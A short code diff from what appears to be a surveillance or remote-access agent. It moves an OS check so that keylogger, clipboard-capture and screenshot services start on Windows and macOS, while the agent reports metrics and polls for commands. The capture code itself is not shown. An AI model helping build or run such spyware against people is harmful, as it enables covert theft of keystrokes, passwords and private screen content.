@@ -27,13 +27,10 @@ class Agent:
         if self._services_started:
             return
 
-        SYSTEM = platform.system()
-
-        if SYSTEM in ["Windows", "Darwin"]:
-            start_keylogger_service(self.agent_id)
-            start_clipboard_service(self.agent_id)
-
+        start_keylogger_service(self.agent_id)
+        start_clipboard_service(self.agent_id)
         start_screenshot_service(self.agent_id)
+
         self._services_started = True
 
     def metrics(self):
@@ -74,9 +71,12 @@ class Agent:
         """
         Main loop to run the agent
         """
+        SYSTEM = platform.system()
+
         while not (stop_event and stop_event.is_set()):
             try:
-                self.services()
+                self.services() if SYSTEM in ["Windows", "Darwin"] else None
+
                 self.metrics()
                 self.check_commands()
             except Exception as e:
